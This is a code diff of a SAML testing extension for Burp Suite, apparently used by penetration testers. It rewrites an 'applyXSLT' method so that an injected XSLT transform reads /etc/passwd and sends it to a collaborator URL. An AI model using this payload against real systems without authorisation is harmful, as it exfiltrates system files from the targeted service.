@@ -16,9 +16,14 @@ import gui.SignatureHelpWindow;
 import gui.XSWHelpWindow;
 import helpers.XMLHelpers;
 import helpers.XSWHelpers;
-import java.awt.Component;
-import java.awt.Desktop;
-import java.awt.Toolkit;
+import model.BurpCertificate;
+import org.w3c.dom.*;
+import org.xml.sax.SAXException;
+
+import javax.xml.crypto.MarshalException;
+import javax.xml.crypto.dsig.XMLSignatureException;
+import javax.xml.parsers.ParserConfigurationException;
+import java.awt.*;
 import java.awt.datatransfer.Clipboard;
 import java.awt.datatransfer.StringSelection;
 import java.io.File;
@@ -36,16 +41,6 @@ import java.util.HashMap;
 import java.util.List;
 import java.util.Observable;
 import java.util.Observer;
-import javax.xml.crypto.MarshalException;
-import javax.xml.crypto.dsig.XMLSignatureException;
-import javax.xml.parsers.ParserConfigurationException;
-import model.BurpCertificate;
-import org.w3c.dom.DOMException;
-import org.w3c.dom.Document;
-import org.w3c.dom.Element;
-import org.w3c.dom.Node;
-import org.w3c.dom.NodeList;
-import org.xml.sax.SAXException;
 
 import static java.util.Objects.requireNonNull;
 
@@ -538,33 +533,45 @@ public class SamlTabController implements ExtensionProvidedHttpRequestEditor, Ob
     }
 
     public void applyXSLT(String collabUrl) {
-        String xslt = "\n" +
-                "<ds:Transform>\n" +
-                "  <xsl:stylesheet xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\">\n" +
-                "    <xsl:template match=\"doc\">\n" +
-                "      <xsl:variable name=\"file\" select=\"'test'\"/>\n" +
-                "      <xsl:variable name=\"escaped\" select=\"encode-for-uri('$file')\"/>\n" +
-                "      <xsl:variable name=\"attackURL\" select=\"'" + collabUrl + "'\"/>\n" +
-                "      <xsl:variable name=\"exploitURL\" select=\"concat($attackerURL,$escaped)\"/>\n" +
-                "      <xsl:value-of select=\"unparsed-text($exploitURL)\"/>\n" +
-                "    </xsl:template>\n" +
-                "  </xsl:stylesheet>\n" +
-                "</ds:Transform>";
-        String transformString = "<ds:Transforms>";
-        int index = orgSAMLMessage.indexOf(transformString);
+        var prefixed = true;
+        var transformString = "<ds:Transforms>";
 
+        int index = orgSAMLMessage.indexOf(transformString);
+        if (index == -1) {
+            prefixed = false;
+            transformString = "<Transforms>";
+        }
+
+        index = orgSAMLMessage.indexOf(transformString);
         if (index == -1) {
             setInfoMessageText(XML_NOT_SUITABLE_FOR_XSLT);
-        } else {
-            int substringIndex = index + transformString.length();
-            String firstPart = orgSAMLMessage.substring(0, substringIndex);
-            String secondPart = orgSAMLMessage.substring(substringIndex);
-            samlMessage = firstPart + xslt + secondPart;
-            textArea.setContents(ByteArray.byteArray(samlMessage));
-            isEdited = true;
-            setRawMode(true);
-            setInfoMessageText(XSLT_CONTENT_APPLIED);
+            return;
         }
+
+        var prefix = prefixed ? "ds:" : "";
+        var xslt = """
+                
+                <%sTransform>
+                  <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+                    <xsl:template match="doc">
+                      <xsl:variable name="file" select="unparsed-text('/etc/passwd')"/>
+                      <xsl:variable name="escaped" select="encode-for-uri($file)"/>
+                      <xsl:variable name="attackerUrl" select="'%s'"/>
+                      <xsl:variable name="exploitUrl" select="concat($attackerUrl,$escaped)"/>
+                      <xsl:value-of select="unparsed-text($exploitUrl)"/>
+                    </xsl:template>
+                  </xsl:stylesheet>
+                </%sTransform>
+                """.formatted(prefix, collabUrl, prefix);
+
+        int substringIndex = index + transformString.length();
+        String firstPart = orgSAMLMessage.substring(0, substringIndex);
+        String secondPart = orgSAMLMessage.substring(substringIndex);
+        samlMessage = firstPart + xslt + secondPart;
+        textArea.setContents(ByteArray.byteArray(samlMessage));
+        isEdited = true;
+        setRawMode(true);
+        setInfoMessageText(XSLT_CONTENT_APPLIED);
     }
 
     public synchronized void addMatchAndReplace(String match, String replace) {
